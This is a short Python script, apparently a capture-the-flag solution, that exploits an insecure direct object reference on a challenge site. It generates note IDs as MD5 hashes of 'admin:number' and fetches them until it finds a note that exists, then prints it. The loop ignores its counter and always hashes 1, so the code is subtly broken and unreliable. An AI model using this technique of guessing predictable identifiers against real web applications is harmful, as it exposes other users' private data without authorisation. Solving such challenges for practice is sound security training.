import requests
import hashlib

def genId( number, user='admin'): 
    h = hashlib.md5(f'{user}:{number}'.encode())
    return h.digest().hex()


for i in range(0,100):
    id = genId(1)
    res = requests.get(f'https://qdor.challenges.cfd/view-note?noteId={id}')
    if res.content != b'Nota n\xc3\xa3o encontrada.':
        print(res.content.decode())
        break
